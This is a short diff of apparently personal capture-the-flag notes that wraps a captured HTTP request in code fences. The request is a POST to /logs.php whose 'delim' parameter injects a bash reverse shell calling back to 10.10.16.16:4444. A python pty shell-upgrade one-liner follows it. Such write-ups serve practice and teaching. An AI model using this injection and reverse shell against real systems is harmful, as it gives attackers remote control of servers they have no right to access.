@@ -64,7 +64,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 //try file_logs.php, luach log.php, with a paramieter delim
 //in burp repeater, code injection to ge ta shell, when use repeater, and we have auth
 
-> POST /logs.php HTTP/1.1
+```
+POST /logs.php HTTP/1.1
 Host: 10.10.11.104
 Content-Length: 67
 Cache-Control: max-age=0
@@ -79,6 +80,7 @@ Accept-Encoding: gzip, deflate, br
 Cookie: PHPSESSID=2mfh665v0ndgmfa0je2hoeq5rp
 Connection: keep-alive
 delim=%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.16/4444+0>%261'%3b
+```
 
 `python -c 'import pty;pty.spawn("/bin/bash")'`
 
